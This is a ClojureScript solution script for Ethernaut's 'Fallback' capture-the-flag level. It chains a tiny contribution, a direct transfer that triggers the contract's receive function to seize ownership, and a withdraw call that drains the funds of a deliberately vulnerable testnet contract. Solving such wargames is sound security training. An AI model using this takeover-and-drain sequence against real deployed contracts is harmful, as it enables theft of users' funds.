(ns ctf.ethernaut.fallback
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]))


;; Ethernaut Challenge #1
;; FALLBACK

;; Get the rinkeby address from ethernaut.openzeppelin.com
(def fallback-addr "0x13Ed5A695ae7fA5c7B2050dAde02A99089144046")



(def fallback (u/get-contract!
               fallback-addr
               (u/abi "/Fallback.sol/Fallback.json")
               w/rinkeby-wallet))

;; contribute condition:
;; require(msg.value < 0.001 ether);
(def contribute-data
  (js-obj "gasLimit"
          2000000
          "value"
          (u/eth-str->wei "0.0009")))

;; receive condition:
;; require(msg.value > 0 && contributions[msg.sender] > 0);
(def txn-data
  (js-obj "to"
          fallback-addr
          "value"
          (u/eth-str->wei "0.2")
          "gasLimit"
          80000))


(comment

  (-> (.contribute fallback contribute-data)

      ;; wait for 6 confirmations
      (.then #(.wait % 6))

      (.then #(.sendTransaction w/rinkeby-wallet
                                txn-data))

      ;; wait for 6 confirmations
      (.then #(.wait % 6))

      (.then #(.withdraw fallback))

      (.then #(.log js/console %))
      (.catch #(.log js/console %)))
  )
